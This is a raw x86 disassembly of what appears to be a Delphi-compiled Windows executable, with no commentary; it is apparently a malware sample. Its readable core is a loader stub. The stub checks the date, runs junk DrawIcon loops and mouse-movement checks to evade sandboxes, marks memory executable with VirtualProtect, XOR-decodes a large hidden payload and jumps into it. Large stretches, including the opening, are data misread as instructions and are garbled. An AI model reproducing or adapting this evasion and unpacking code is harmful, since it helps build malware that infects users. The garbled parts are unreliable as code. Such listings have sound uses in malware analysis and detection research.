add [ eax ] al
adc [ eax ] eax
add [ ecx ] cl
pushad
add eax [ eax ]
add [ esi ] dl
je r-xdata
outsd
ja r-xdata
inc ebx
add al bh
les eax [ edx ]
or [ edx + 0x43 ] ah
add [ eax + 0x780044d6 ] ah
jo r-xdata
insb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
xor al [ esi ]
outsb
je r-xdata
outsd
xor [ si + 0x3 ] edi
add [ eax ] al
sbb eax [ eax ]
adc edx [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x65537265
je r-xdata
inc esp
imul esp [ ecx + 0x6c ] 0x6c31676f
add eax [ eax ]
add [ ecx ] bl
add [ edx ] dl
dec edi
jo r-xdata
or edx [ ebx + 0x61 ]
arpl [ ebp + 0x78 ] dx
je r-xdata
imul esi [ ecx + esi + 0x60 ] 0x16000003
outsb
xor al [ ebx + eax ]
add [ ecx ] al
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
je r-xdata
xor [ eax ] esp
add eax [ eax ]
add [ ebx ] cl
add [ edi ] cl
inc esp
popad
je r-xdata
mov eax [ ebx ]
test [ ebx - 0x435bffba ] bh
add [ ebp + ecx * 8 + 0xe580042 ] al
outsd
xor al [ si + 0x3 ]
imul esp [ ecx + 0x6c ] 0x7831676f
add eax [ eax ]
add [ eax + eax ] bl
push cs
push edx
jo r-xdata
inc esi
add [ edi + ecx * 4 ] bh
inc ebx
add [ eax ] dh
xchg edx eax
inc ebx
add [ ebx + 0x48510cc0 ] cl
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
insd
push esp
inc esi
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
imul esp [ ecx + 0x6c ] 0x632676f
xor [ 0x42f14c00 ] ebx
add ah ch
inc [ edx ]
movsb [ edi ] [ esi ]
push edi
outsd
jb r-xdata
xor al [ 0x4654 ]
jb r-xdata
inc ebp
add ah bh
push edx
inc ebx
add al dl
dec esp
inc ebx
add [ edi + edi + 0x46 ] cl
add [ ebp + ecx * 4 - 0x74cbffbd ] ah
inc ebx
add [ ebx + edi * 4 - 0x435bffba ] al
add [ edi ] eax
shr [ ecx + 0x46 ] 0x0
pushad
insb
inc esi
add [ esi + edx * 8 ] bl
inc edx
add [ eax + ecx + 0x43 ] cl
add [ eax + 0x6d ] dh
jo r-xdata
push ebx
imul esp [ ecx + 0x6c ] 0x7031676f
add eax [ eax ]
add [ edx ] bl
add [ edx ] dl
push ebx
popad
jbe r-xdata
outsb
push eax
imul esp [ ebx + 0x74 ] 0x44657275
jae r-xdata
or [ ebp + 0x61 ] ecx
push eax
add eax [ eax ]
add [ ebx ] dl
add [ edx ] cl
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
outsd
je r-xdata
xor [ eax ] edi
add eax [ eax ]
add [ eax ] dl
add [ esi ] cl
inc esp
push ebx
jb r-xdata
insd
imul ebp [ ebp + 0x65 ] 0x6b636950
jb r-xdata
push esp
retn
xor esp esp
dec esp
dec eax
add [ esi + edi * 2 ] cl
inc ebp
add [ eax + eax + 0x5 ] bl
push ebp
outsb
imul esi [ ecx + esi ] 0x3dc08b00
jbe r-xdata
clc
inc edx
add al ch
loopne r-xdata
mov al [ 0x780044d6 ]
popad
arpl [ ebp + 0x44 ] sp
imul esp [ ecx + 0x6c ] 0x7c31676f
add eax [ eax ]
add [ ebx ] bl
add [ ebx ] dl
push eax
jb r-xdata
dec edi
jo r-xdata
je r-xdata
imul esp [ ecx + 0x6c ] 0x8032676f
add eax [ eax ]
add [ edi ] dl
add [ ebx ] cl
inc esi
outsd
outsb
je r-xdata
adc [ eax ] eax
add [ eax ] al
insb
adc [ eax ] al
add eax 0x74696e55
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push sub_485181
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485188
add [ eax ] al
cmp edx 0x9
jbe r-xdata
inc ebp
add [ eax - 0x53ffb8f2 ] cl
sub eax [ edi ]
push cs
outsb
je r-xdata
call 0xffffffff84489393
int 0x42
add [ eax + 0xe ] bl
add [ ecx ] bl
add [ edx ] dl
imul esp [ ecx + 0x6c ] 0x8432676f
add eax [ eax ]
cmp ecx 0x3d9
retn
nop
nop
pop eax
jb r-xdata
je r-xdata
sub_4850c3
int1
inc esi
add al ah
and [ edi ] eax
or al 0x1
inc edi
add al al
imul eax [ esi ] r-xdata
sbb al 0xd6
inc edx
add [ eax + ecx + 0x43 ] cl
add [ eax + 0x6d ] dh
inc ebp
add ah bh
push edx
inc ebx
add al dl
dec esp
inc ebx
add [ edi + edi + 0x46 ] cl
add [ ebp + ecx * 4 - 0x74cbffbd ] ah
inc ebx
add [ ebx + edi * 4 - 0x435bffba ] al
inc esi
add [ edi + ecx * 4 ] bh
inc ebx
add [ eax ] dh
xchg edx eax
inc ebx
add [ ebx + 0x48510cc0 ] cl
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
retn
xor esp esp
dec esp
dec eax
add [ esi + edi * 2 ] cl
inc ebp
add [ eax + eax + 0x5 ] bl
push ebp
outsb
imul esi [ ecx + esi ] 0x3dc08b00
jbe r-xdata
adc [ eax ] eax
add [ eax ] al
insb
adc [ eax ] al
add eax 0x74696e55
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push sub_485181
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485188
add [ eax ] al
cmp edx 0x9
jbe r-xdata
cmp ecx 0x3d9
retn
nop
nop
sub_48513c
inc eax
push ecx
dec eax
add [ ecx ] dl
add ch [ esi ]
xor al 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] dl
add [ eax ] al
add [ eax + edx + 0x40 ] ch
add [ 0x74696e55 ] al
xor [ ebx - 0x1374aa40 ] ecx
xor eax eax
push ebp
push sub_485181
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_485188
retn
sub_48518c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi rw-data
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
push rw-data
call GetLocalTime
nop
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
nop
mov ebx 0x1ba2
nop
jmp r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
nop
nop
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
nop
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call PatBlt
call GetLastError
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
mov ebx 0x8fb3
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
dec ebx
jne r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
nop
nop
mov eax 0x1f74d311
call sub_402744
mov ecx eax
test ecx ecx
je r-xdata
nop
nop
mov ebx 0x1
mov edi 0x41
xor edx edx
div edi
cmp edx 0xff
jbe r-xdata
call sub_403600
mov eax ecx
add eax ebx
jae r-xdata
call sub_4035f8
mov [ eax ] dl
nop
inc ebx
cmp ebx 0x1f74c9ae
jne r-xdata
call sub_403600
nop
mov eax ebx
add eax 0x1
jae r-xdata
nop
nop
mov eax ecx
call sub_402764
nop
mov ebx 0x86d2
push 0x0
push 0x0
push 0x0
push 0x0
call DrawIcon
dec ebx
jne r-xdata
nop
xor ebx ebx
nop
push rw-data
call GetCursorPos
cmp eax 0x1f
jbe r-xdata
call sub_403600
push 0x0
push 0x1e
call SleepEx
nop
nop
cmp ebx 0x7
jbe r-xdata
add ebx 0x1
jae r-xdata
nop
push esi
call GetCursorPos
nop
nop
mov eax [ esi ]
sub eax [ rw-data ]
jno r-xdata
nop
mov eax rw-data
mov edx rw-data
mov ecx [ sub_48513c ]
call sub_405af0
cmp [ rw-data ] 0x0
je r-xdata
nop
nop
mov eax [ esi ]
mov [ rw-data ] eax
call sub_403600
nop
nop
push rw-data
push 0x40
push 0x5d66
mov eax [ rw-data ]
push eax
call VirtualProtect
xor ebx ebx
mov al [ eax ]
xor al 0x68
mov edx [ rw-data ]
add edx ebx
jae r-xdata
call sub_403600
mov [ edx ] al
nop
inc ebx
cmp ebx 0x5d67
jne r-xdata
call sub_403600
mov eax [ rw-data ]
add eax ebx
jae r-xdata
nop
nop
mov ebx 0x9ac
nop
mov eax [ rw-data ]
add eax ebx
jae r-xdata
mov [ rw-data ] eax
nop
mov ecx 0x1a28
mov edx [ rw-data ]
mov eax 0x240a
call sub_485128
jmp [ rw-data ]
call sub_403600
sub_485431
add [ eax ] al
add [ esi + 0x6f ] al
dec ecx
xor al 0x52
xor ebp [ ecx + 0x38 ]
ja r-xdata
add [ eax + 0x40 ] bl
add ah bl
fiadd [ eax ]
insb
loope r-xdata
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
retn
add [ eax ] bh
lahf
inc edx
add al ch
xchg edi eax
inc edx
add [ eax + 0x3c004297 ] bh
clc
add [ ecx ] bh
inc eax
add ah dl
and [ ecx ] eax
jo r-xdata
add [ esi + ecx * 4 + 0x42 ] ch
add [ esi + ecx * 4 ] bh
inc edx
add [ eax ] ah
mov al 0x42
add ah bl
scasd [ edi ]
inc edx
add [ eax - 0x61 ] ch
inc edx
inc ecx
add al bh
and al 0x41
add al cl
and al 0x41
add ah al
xor al [ ecx ]
je r-xdata
inc ecx
add [ eax + edi * 8 ] cl
inc ecx
add [ eax - 0x76 ] bh
inc edx
add [ ecx + ecx * 4 + 0x3040042 ] ah
inc ebp
add ah dl
add al [ ebp ]
test al 0x9f
inc edx
add [ eax - 0x61 ] bh
inc edx
add [ eax + 0x67 ] cl
inc ebp
add al bl
inc bp
add [ eax + 0x180044d3 ] al
rol [ eax + eax + 0x68 ] cl
jmp 0xffffffffe980557a
cmp al 0xf8
inc ecx
add [ eax - 0xc ] ch
inc ecx
add al al
inc ecx
add [ ebx + ecx * 4 - 0x747bffbe ] dh
inc edx
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_406844
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461da8
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_461dc0
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461e40
call sub_40433c
sub_401187
add [ esp + 0x4 ] 0xfffffff8
jmp sub_406264
sub_401191
add [ esp + 0x4 ] 0xfffffff8
jmp sub_406278
sub_401250
jmp [ __import_lookup_table_0(kernel32:CloseHandle) ]
sub_401258
jmp [ __import_lookup_table_0(kernel32:CreateFileA) ]
GetFileType
jmp [ GetFileType@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
sub_401280
jmp [ __import_lookup_table_0(kernel32:ReadFile) ]
sub_401290
jmp [ __import_lookup_table_0(kernel32:SetEndOfFile) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_4012c0
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_4012c8
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_4012d0
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_4012d8
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_4012e8
jmp [ __import_lookup_table_0(kernel32:GetLastError) ]
sub_4012f0
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_4012f8
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401300
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_401308
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_401318
jmp [ __import_lookup_table_0(kernel32:GetThreadLocale) ]
sub_401328
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_401348
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ WideCharToMultiByte@IAT ]
sub_401368
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
SysFreeString
jmp [ SysFreeString@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_401398
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_4013a0
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_4013c4
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ VirtualFree@IAT ]
sub_4013e4
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_4013ec
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_4013f4
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_4013fc
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401b46
jmp sub_403e54
sub_401b4d
mov al [ rw-data ]
pop ebp
retn
sub_401c2a
jmp sub_403e54
sub_401cf8
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_40230c
retn
sub_4022f8
jmp sub_403e54
sub_40249e
jmp sub_403e54
sub_402731
jmp sub_403e54
sub_4027f4
call sub_4067f8
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_4067f8
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_402848
mov [ rw-data ] edx
call sub_404414
sub_4028ac
push eax
push edx
push ecx
call sub_4067f8
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_4028a0
retn
sub_4028c8
retn
sub_4028dc
push ebx
call sub_4067f8
mov ebx [ eax + 0x4 ]
call sub_4067f8
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402b5c
mov dx 0xd7b2
call sub_402b04
retn
sub_402be4
push ebx
mov ebx eax
push ebx
call sub_401250
dec eax
sete al
pop ebx
retn
sub_402dbf
retn
sub_402e08
mov edx [ eax + 0x1c ]
call sub_402dc0
retn
sub_402e14
mov edx [ eax + 0x20 ]
call sub_402dc0
retn
sub_402ea7
retn
sub_402ea8
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4028fc
retn
sub_4031c4
mov ecx 0xff
call sub_4031d0
retn
sub_4031f4
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_403210
jmp sub_403210
sub_40320d
retn
sub_403599
jmp sub_403e54
sub_4035ec
fninit
fwait
fldcw [ rw-data ]
retn
sub_4035f8
mov al 0x4
jmp sub_4028a0
sub_40364c
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_403658
push ebx
mov ebx eax
mov eax ebx
call sub_403688
call sub_402744
mov edx eax
mov eax ebx
call sub_4036cc
pop ebx
retn
sub_403674
push ebx
mov ebx eax
mov eax ebx
call sub_403724
mov eax ebx
call sub_402764
pop ebx
retn
sub_403688
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_4036b0
call sub_403a8c
test dl dl
jle r-xdata
retn
call sub_403a74
sub_403770
retn
sub_4037f8
jmp sub_403e54
sub_4037ff
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403908
mov eax 0x8000ffff
retn
sub_403910
retn
sub_403914
retn
sub_403918
retn
sub_403a4d
jmp sub_403ba0
sub_403a52
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403eb4
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_403a74
sub_403a74
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403a7c
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_403a8c
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403a9c
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_403b64
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_403b80
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403f4d
retn
sub_404090
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_40411e
jmp sub_403ba0
sub_40417e
jmp sub_403ba0
sub_404198
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_404090
mov [ rw-data ] 0x0
call sub_404138
retn
sub_4042ad
retn
sub_40440f
pop ebp
pop edi
pop esi
pop ebx
retn
sub_404414
mov [ rw-data ] eax
call sub_40433c
sub_404648
retn
sub_404684
retn
sub_404692
retn
sub_4046ab
retn
sub_4046ac
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404580
mov ecx [ edx - 0x4 ]
shr ecx 0x1
sub_4046bc
retn
sub_4047a3
retn
sub_404824
retn
sub_4048cc
test eax eax
je r-xdata
retn
mov edx [ eax - 0x8 ]
inc edx
jle r-xdata
[ eax - 0x8 ]
j_sub_4048e8
jmp sub_4048e8
sub_404931
retn
sub_404939
retn
sub_40497b
retn
sub_404aeb
retn
sub_404af4
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_4028a0
sub_404b0c
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404c64
retn
sub_404c68
xor ecx ecx
test edx edx
je r-xdata
jmp sub_404b7c
mov ecx [ edx - 0x4 ]
sub_404c76
retn
sub_404c78
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_404ecc
mov ecx 0x1
jmp sub_404e38
sub_404ed6
retn
sub_404ff8
mov ecx 0x1
jmp sub_404f0c
sub_405002
retn
sub_405212
retn
sub_405214
push edx
call sub_402744
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404ecc
pop eax
sub_405228
push eax
call sub_404ff8
pop eax
call sub_402764
retn
sub_405238
xchg ecx eax
xchg edx ecx
call sub_404580
retn
sub_40528c
mov al 0x10
jmp sub_4028a0
sub_4052ac
mov edx rw-data
xor eax eax
mov [ edx + eax * 4 ] sub_40528c
inc eax
cmp eax 0x2b
jne r-xdata
mov eax r-xdata
mov [ rw-data ] eax
retn
sub_4052cc
push esi
push edi
mov edi eax
mov esi rw-data
mov ecx 0x2b
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_4052e0
push esi
push edi
mov esi eax
mov edi rw-data
mov ecx 0x2b
[ edi ] [ esi ]
pop edi
pop esi
retn
sub_40530c
jmp [ rw-data ]
sub_405314
jmp [ rw-data ]
sub_405324
jmp [ rw-data ]
sub_40533c
jmp [ rw-data ]
sub_405344
jmp [ rw-data ]
sub_405354
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
pop ebp
retn 0x8
sub_405380
jmp [ rw-data ]
sub_405388
jmp [ rw-data ]
sub_405390
jmp [ rw-data ]
sub_405398
jmp [ rw-data ]
sub_4053a0
mov ecx 0xe
jmp [ rw-data ]
sub_4053ac
push eax
call sub_4052f4
pop eax
retn
sub_4053b4
mov al 0x11
jmp sub_4028a0
sub_4053df
retn
sub_405458
retn
sub_4054a5
retn
sub_405522
retn
sub_405572
retn
sub_405590
retn
sub_4055b0
retn
sub_4057d8
test eax eax
je r-xdata
retn
mov eax [ eax - 0x4 ]
sub_4057e8
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_405120
pop ebp
retn 0x4
j_sub_404f0c
jmp sub_404f0c
sub_4057fd
retn
sub_405800
call sub_405ab4
retn
sub_405994
push esp
add [ esp ] 0x4
call sub_405808
retn
sub_405b40
call sub_405b18
retn
sub_405e89
jmp sub_403e54
sub_405ff4
call sub_405ffc
retn
sub_406028
call sub_406038
retn
sub_406030
call sub_406058
retn
sub_406038
push ebx
mov ebx eax
mov eax 0x8
call sub_402744
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_4060f3
jmp sub_403ba0
sub_406114
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_406188
jmp sub_403e54
sub_40618f
pop ecx
pop ebp
retn
sub_406204
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_406210
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_40621c
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_4028a0
sub_40622c
call sub_403658
mov [ eax + 0x4 ] 0x1
retn
sub_406264
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call InterlockedIncrement
pop ebp
retn 0x4
sub_40655f
jmp sub_403e54
sub_406566
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_406603
jmp sub_403e54
sub_40660a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_406653
jmp sub_403e54
sub_40665a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_406702
jmp sub_403e54
sub_406709
pop ebp
retn
sub_406780
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_4067a0
push eax
push 0x40
call LocalAlloc
retn
sub_4067ac
mov eax 0x10
retn
sub_406838
mov eax rw-data
call sub_406114
retn
sub_4068ad
jmp sub_403e54
sub_4068b4
pop ebp
retn
sub_4068b8
sub [ rw-data ] 0x1
retn
sub_4068c0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_4068dc
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406944
mov edx [ eax + 0x8 ]
cmp edx [ eax ]
jle r-xdata
mov al 0x1
retn
mov edx [ eax + 0xc ]
cmp edx [ eax + 0x4 ]
jle r-xdata
xor eax eax
retn
sub_40695c
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_4069e1
jmp sub_403e54
sub_4069e8
pop ebp
retn
sub_4069ec
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ __import_lookup_table_5(advapi32:RegCloseKey) ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
EnterCriticalSection
jmp [ EnterCriticalSection@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ FileTimeToLocalFileTime@IAT ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetLocalTime
jmp [ __import_lookup_table_6(kernel32:GetLocalTime) ]
GetLocaleInfoA
jmp [ __import_lookup_table_6(kernel32:GetLocaleInfoA) ]
GetModuleHandleA
jmp [ __import_lookup_table_6(kernel32:GetModuleHandleA) ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ GlobalFindAtomA@IAT ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalReAlloc) ]
GlobalSize
jmp [ __import_lookup_table_6(kernel32:GlobalSize) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ __import_lookup_table_6(kernel32:LoadResource) ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_406bf4
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualProtect
jmp [ __import_lookup_table_6(kernel32:VirtualProtect) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
WinExec
jmp [ WinExec@IAT ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreateICA
jmp [ CreateICA@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
EndDoc
jmp [ EndDoc@IAT ]
EndPage
jmp [ EndPage@IAT ]
ExcludeClipRect
jmp [ __import_lookup_table_8(gdi32:ExcludeClipRect) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:GetBrushOrgEx) ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
